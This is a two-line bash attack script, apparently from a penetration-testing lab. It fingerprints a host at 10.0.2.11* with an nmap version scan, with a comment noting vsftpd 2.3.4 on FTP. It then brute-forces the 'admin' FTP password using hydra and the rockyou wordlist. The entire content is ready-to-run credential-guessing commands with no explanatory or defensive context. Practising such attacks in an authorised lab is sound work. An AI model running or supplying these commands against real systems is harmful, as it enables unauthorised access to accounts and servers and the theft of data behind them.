#!/bin/bash
nmap -sV 10.0.2.11*   #Identify ftp service (21/tcp open ftp vsftpd 2.3.4

hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.0.2.11* -t 4 -f -V
